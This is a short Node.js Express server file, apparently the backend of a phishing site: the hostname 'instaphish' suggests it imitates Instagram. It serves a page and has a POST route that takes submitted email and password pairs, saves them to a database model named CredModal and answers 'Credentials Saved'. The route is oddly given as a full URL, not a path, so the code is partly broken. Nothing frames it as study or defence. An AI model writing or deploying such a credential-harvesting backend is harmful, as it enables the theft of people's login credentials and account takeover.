const express = require("express")
const path = require('path');
const cors = require('cors')
const {CredModal} = require("./db")

const app = express()
app.use(express.static('public'))
app.use(cors())
app.use(express.json())


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, './index.html'))
})

app.post("https://instaphish-0w7o.onrender.com/send", async (req, res) => {

    const {email, password} = req.body;
    try {

        await CredModal.create({
            email,
            password
        })
    } catch (e) {

        console.log(e);


    }

    res.send({
        msg:"Credentials Saved"
    })



}
)

app.listen(3000)